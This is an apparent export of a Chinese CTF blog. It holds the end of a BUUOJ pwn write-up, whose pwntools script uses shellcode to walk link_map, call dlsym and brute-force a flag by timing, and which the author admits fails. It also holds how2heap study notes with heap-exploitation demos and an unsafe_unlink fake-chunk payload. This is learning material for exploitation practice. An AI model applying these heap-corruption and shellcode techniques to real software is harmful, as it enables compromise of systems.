link_map<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* These first few members are part of the protocol with the debugger.        This is the same format used in SVR4.  */</span>    <span class="token function">ElfW</span> <span class="token punctuation">(</span>Addr<span class="token punctuation">)</span> l_addr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Difference in address on ELF and memory.  */</span>     <span class="token keyword">char</span> <span class="token operator">*</span> l_name<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Filename.  */</span>     <span class="token function">ElfW</span> <span class="token punctuation">(</span>Dyn<span class="token punctuation">)</span> <span class="token operator">*</span> l_ld<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* "Dynamic" area of the object.  */</span>     <span class="token keyword">struct</span> link_map <span class="token operator">*</span> l_next<span class="token punctuation">,</span> <span class="token operator">*</span> l_prev<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Doubly linked list.  */</span> <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>其中偏移0x18地址处为next指针</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606728980025.png" alt="next指针"></p><p>如果地址不是0x7f开头就认为是用户使用dlopen加载的。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>file_path<span class="token operator">=</span><span class="token string">"./maps_debug"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># p = process([file_path])</span>    elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p, "b *$rebase(0x121c)")</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.169'</span><span class="token punctuation">,</span> <span class="token number">57404</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    debug_str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            text_base<span class="token operator">=</span><span class="token number">0</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>val<span class="token punctuation">)</span><span class="token punctuation">:</span>    shell_asm<span class="token operator">=</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>setregs<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'rax'</span><span class="token punctuation">:</span><span class="token number">0x602008</span><span class="token punctuation">,</span><span class="token string">'rbx'</span><span class="token punctuation">:</span><span class="token number">0x7f0000000000</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    shell_asm <span class="token operator">+=</span> <span class="token string">"mov rdx,[rax]\n"</span> \                 <span class="token string">"loop1:\n"</span> \                 <span class="token string">"  mov rdx,[rdx+0x18]\n"</span> \                 <span class="token string">"  cmp rdx,rbx\n"</span> \                 <span class="token string">"  jge loop1\n"</span>    <span class="token comment" spellcheck="true"># shell_asm+=</span>    shell_asm<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>pushstr<span class="token punctuation">(</span><span class="token string">"correct_flag_13333337"</span><span class="token punctuation">)</span>    shell_asm <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>mov<span class="token punctuation">(</span><span class="token string">'rcx'</span><span class="token punctuation">,</span><span class="token number">0x602028</span><span class="token punctuation">)</span>    shell_asm <span class="token operator">+=</span><span class="token string">"mov rcx,[rcx]\n"</span> <span class="token comment" spellcheck="true">#puts_got</span>    shell_asm <span class="token operator">+=</span> <span class="token string">"add rcx,0x371650\n"</span> <span class="token comment" spellcheck="true">#计算处dlsym函数</span>    shell_asm <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>setregs<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'rdi'</span><span class="token punctuation">:</span><span class="token string">'rdx'</span><span class="token punctuation">,</span><span class="token string">'rsi'</span><span class="token punctuation">:</span><span class="token string">'rsp'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    shell_asm<span class="token operator">+=</span><span class="token string">"call rcx \n"</span>    shell_asm<span class="token operator">+=</span><span class="token string">"call rax \n"</span>    shell_asm<span class="token operator">+=</span><span class="token string">"mov dl,BYTE PTR [rax+{:d}]\n"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>    shell_asm<span class="token operator">+=</span><span class="token string">"cmp dl,{:d}\n"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>val<span class="token punctuation">)</span>    shell_asm<span class="token operator">+=</span><span class="token string">"jge good\n"</span>    shell_asm<span class="token operator">+=</span><span class="token string">"bad:\n"</span> \               <span class="token string">"    mov rax,0x3c\n"</span> \               <span class="token string">"    xor rdi,rdi\n"</span> \               <span class="token string">"    syscall\n"</span> \               <span class="token string">"good:\n"</span> \               <span class="token string">"    jmp $+0"</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>shell_asm<span class="token punctuation">)</span>    payload<span class="token operator">=</span>asm<span class="token punctuation">(</span>shell_asm<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token comment" spellcheck="true"># debug_1([0x000000000400E2E])</span><span class="token keyword">import</span> stringflag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>get_payload<span class="token punctuation">(</span>i<span class="token punctuation">,</span>ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>            p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            flag<span class="token operator">+=</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># p.interactive()</span></code></pre><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>上面的脚本其实不能得到flag<br>因为在调用dlsym函数的时候总是失败不知道什么原因。。。。。。。。。。。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> BUUOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how2heap注意点总结-上</title>
      <link href="2020/11/29/how2heap%E6%B3%A8%E6%84%8F%E7%82%B9%E6%80%BB%E7%BB%93-%E4%B8%8A/"/>
      <url>2020/11/29/how2heap%E6%B3%A8%E6%84%8F%E7%82%B9%E6%80%BB%E7%BB%93-%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="first-fit"><a href="#first-fit" class="headerlink" title="first-fit"></a>first-fit</h2><pre><code>我的理解是分割unsortedbin里面第一个大于要分配的chunk，但是实际上并不是这样</code></pre><p>测试程序</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123;    int m;    scanf(&quot;%d&quot;,m);    char* a = malloc(0x256);    char* b = malloc(0x200);    char* e = malloc(0x100);    char* f = malloc(0x256);    char* c;    free(e);    free(a);//前插    c = malloc(0x80);//分割足够大的chunk（是找到最适合的，best_fit），遍历unsortedbin把除了分割的一个链入对应的bins，被分割剩下的chunk放入unsortedbin&#125;</code></pre><p>编译命令<code>gcc -g  -fno-stack-protector -z execstack -no-pie first-fit.c -o first-fit</code><br>可以用python来加载</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/glibc/2.23/64/lib/ld-2.23.so"</span><span class="token punctuation">,</span><span class="token string">"./first-fit"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>env<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">:</span><span class="token string">"/glibc/2.23/64/lib/libc.so.6"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># io = gdb.debug("first-fit","break main")</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>exe<span class="token operator">=</span><span class="token string">"first-fit"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行到要返回的时候堆内容如下<br><img src="https://img-blog.csdnimg.cn/20200303113853810.png" alt="在这里插入图片描述">可以看出来这里分割的是e也就是说会遍历unsortedbin 找到大小最接近的chunk来分割。<br>其他chunk会放入对应的bins，被分割的chunk剩下的部分放入unsortedbin。<br><strong>经过后来的测试得出来的结论</strong></p><ul><li>1.如果fastbin没有找到合适的chunk，从unsortedbin里面查找。</li><li>2.在查找unsortedbin之前会进行fast bins里面的chunk合并，合并之后放入unsortedbin里面</li><li>3.如果unsortedbin里面找到了大小刚好相同的chunk，直接取出，分配结束</li><li>4.如果unsortedbin里面没找到大小刚好相同的chunk遍历unsortedbin把chunk放入相应的bins（不会放入fastbins）</li><li>5.紧接着遍历其他的biins找到合适的chunk进行切割，切割剩余放入unsortedbin中<br>（跟一些地方写的不太一样，但是解释的通测试遇到的很多问题。有什么问题感谢联系。）</li></ul><p>对于包含tcatch的libc会直接从topchunk扩展。</p><p>图中的箭头所指为c<br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3d3dy5pZnZtbmtsY2Rrcy5jbzo1MTIwL3VwbG9hZHMvYmlnL2I2MmIzZThmNmRhNDg1MTY5OGFjNjNmZjljYWY2ZGE4LnBuZw?x-oss-process=image/format,png"></p><h2 id="fast-bin-into-stack"><a href="#fast-bin-into-stack" class="headerlink" title="fast_bin_into_stack"></a>fast_bin_into_stack</h2><p>是比较常用的fastbin attack这里是介绍一些经验<br>free fast chunk的时候会检查fastbins如果被main_arena直接连接的chunk被再次free会报错<br><img src="https://img-blog.csdnimg.cn/20200303122502124.png" alt="在这里插入图片描述"><br>这种情况下double free想用这个0x20要写入的地址是0x7fffffffe5b0-8<br><img src="https://img-blog.csdnimg.cn/20200303122647478.png" alt="在这里插入图片描述"><br>放到了对应位置</p><p>如果想用这里的0x7f作为size<br><img src="https://img-blog.csdnimg.cn/20200303123324261.png" alt="在这里插入图片描述"><br>需要0x7fffffffe670-3<br><img src="https://img-blog.csdnimg.cn/20200303123223128.png" alt="在这里插入图片描述"><br>由以上总结：想要用一个字节作为size字段需要用这一行的地址减去它的字节数再减一<br>0x70-3=0x6d        </p><p>double free进入stack条件：需要size，需要栈的加载地址（对于ALSR开启想用这种方法修改栈需要泄露栈地址 ）<br>fast_bin_attack 需要</p><ul><li>1.fastbin </li><li>2.Size</li><li>3.想要attack哪里需要哪里的地址(bss段地址，stack地址)</li><li>4.需要uaf或者doublefree</li></ul><p>结果：可以申请到一个地址的空间写入数据。<br>技巧：想要用一个字节作为size字段需要用这一行的地址减去它的字节数再减一(这个字节数是从0开始数的)</p><h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>在分配 large bin chunk 的时候，会调用 malloc_consolidate()，这个函数会遍历所有的 fastbin 把里面的 chunk 该合并合并，更改inuse位，然后全部插入 unsorted bin 中。</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">void</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">void</span><span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocated two fastbins: p1=%p p2=%p\n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now free p1!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">void</span><span class="token operator">*</span> p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span><span class="token punctuation">,</span> p3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Trigger the double free vulnerability!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We can pass the check in malloc() since p1 is not fast top.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>实际上当执行完 void* p3 = malloc(0x400);之后调用malloc_consolidate函数<br><img src="https://img-blog.csdnimg.cn/20200308112222553.png" alt="在这里插入图片描述"><br>这个函数会刷新bins，把fastbin回收放入unsortedbin之后遍历unortedbin，把对应的chunk放入对应bins中，然后尝试能不能找到能分割的chunk(这里没有找到)<br>执行完第二次free(p1);<br><img src="https://img-blog.csdnimg.cn/20200308120033267.png" alt="在这里插入图片描述"><br>可以看出fast chunk再次被释放回到了fastbin链里面，smallbins里面没有了这个chunk。<br><img src="https://img-blog.csdnimg.cn/20200308120340186.png" alt="在这里插入图片描述"><br>但是下一个chunk的previnue位变成了零。放入smallbin会改变标志位，然后再次free放入fast bin不会改变标志位，所以这里的标志位会变成0，然后从fastbin获取chunk当然也不会更改inuse位<br>总结：free掉大chunk会把小的fastbin中的chunk放入smallbin并改变标志位，再次free小chunk会让小chunk回到fastbin，转一圈的收获是小chunk物理相邻下一个chunk的prev_inuse位会置零。可以配合unlink</p><p>需要：</p><ul><li>fastbin能够double-free</li><li>能申请一个large chunk<br>结果：修改fast chunk的物理相邻的chunk的prev_inuse位，可以配合unlink使用<br>Hitcon 2016 SleepyHolder参考   <a href="https://blog.csdn.net/qq_38204481/article/details/104731016">https://blog.csdn.net/qq_38204481/article/details/104731016</a><h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2>参考：<a href="https://blog.csdn.net/qq_38204481/article/details/82808011">https://blog.csdn.net/qq_38204481/article/details/82808011</a><br>需要：</li><li>1.指针列表指针指向chunk  这种结构(知道bss段地址)或知道main_area地址(也就是libc地址)（需要知道指针列表的地址）</li><li>2.能修改prev_inuse位。可以是double free（fastbin_dup_consolidate）也可以是uaf或者是堆溢出。<br>payload使用</li></ul><pre class=" language-python"><code class="language-python">f_ptr <span class="token operator">=</span> <span class="token number">0x6020d0</span>   <span class="token comment" spellcheck="true">#是一个指针，指向的内容能写入fake_chunk</span>fake_chunk <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#伪造本chunk的size</span>fake_chunk <span class="token operator">+=</span> p64<span class="token punctuation">(</span>f_ptr <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>f_ptr<span class="token number">-0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#伪造fd，bk</span>fake_chunk <span class="token operator">+=</span> <span class="token string">'\x20'</span>  <span class="token comment" spellcheck="true">#下一个chunk的prev_size位，和开头chunksize保持一致</span><span class="token operator">+</span>下一个chunk是修改过prev_inuse位的</code></pre><p>设置payload过程只需要知道一个chunk的指针，然后往chunk中写数据就ok了。</p><p>结果是把f_ptr-0x18写入到*f_ptr</p><hr><hr><h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> cc<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span>cc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> fake_chunks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// this is the size</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) &amp;&amp; &lt; av->system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>    fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1234</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// nextsize</span>    a <span class="token operator">=</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//释放之前布置好了本chunk的size(可控1)，后一个chunk的size(可控2)</span>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc(0x30): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>运行结束之后<br><img src="https://img-blog.csdnimg.cn/20200809173959584.png" alt="在这里插入图片描述"></p><p>申请到了任意一段空间。<br>总结需要：<br><img src="https://img-blog.csdnimg.cn/20200308171621269.png" alt="在这里插入图片描述"><br>在两个地址处写入size。<br>对size的要求：</p><ul><li>1.可控1size位在fastbin范围内，size对齐的4位中第二第四位不能为1</li><li>2.可控2的size位大于0x10小于system_mem（64位是128kb）</li><li>3.需要一个能够被free的指针指向可控1的size后面(一般是正常指针指向目标区域,目标区域的chunk的size在可控1范围内)<br>结果:可以扩大或者缩小申请到的堆空间,修改其他chunk的空间<br>经验：一般条件3中的指针是正常存在的，可以修改的是size，这时候可以放大或缩小chunk让chunk重合。</li></ul><hr><h2 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  uint8_t <span class="token operator">*</span>a<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST08_8</span>  <span class="token keyword">int</span> real_a_size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST04_4</span>  uint8_t <span class="token operator">*</span>b<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST10_8</span>  uint8_t <span class="token operator">*</span>c<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST18_8</span>  <span class="token keyword">void</span> <span class="token operator">*</span>barrier<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST20_8</span>  uint8_t <span class="token operator">*</span>b1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST38_8</span>  uint8_t <span class="token operator">*</span>b2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST40_8</span>  uint8_t <span class="token operator">*</span>d<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST48_8</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"Welcome to poison null byte 2.0!\n"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x21uLL</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"Tested in Ubuntu 14.04 64bit.\n"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x1EuLL</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span>    <span class="token string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span><span class="token punctuation">,</span>    <span class="token number">1uLL</span><span class="token punctuation">,</span>    <span class="token number">0x6CuLL</span><span class="token punctuation">,</span>    <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span>    <span class="token string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span><span class="token punctuation">,</span>    <span class="token number">1uLL</span><span class="token punctuation">,</span>    <span class="token number">0x61uLL</span><span class="token punctuation">,</span>    <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"We allocate 0x100 bytes for 'a'.\n"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x21uLL</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  a <span class="token operator">=</span> <span class="token punctuation">(</span>uint8_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//这个chunk要有off_by_one_null漏洞</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"a: %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>  real_a_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">fprintf</span><span class="token punctuation">(</span>    <span class="token constant">stderr</span><span class="token punctuation">,</span>    <span class="token string">"Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): %#x\n"</span><span 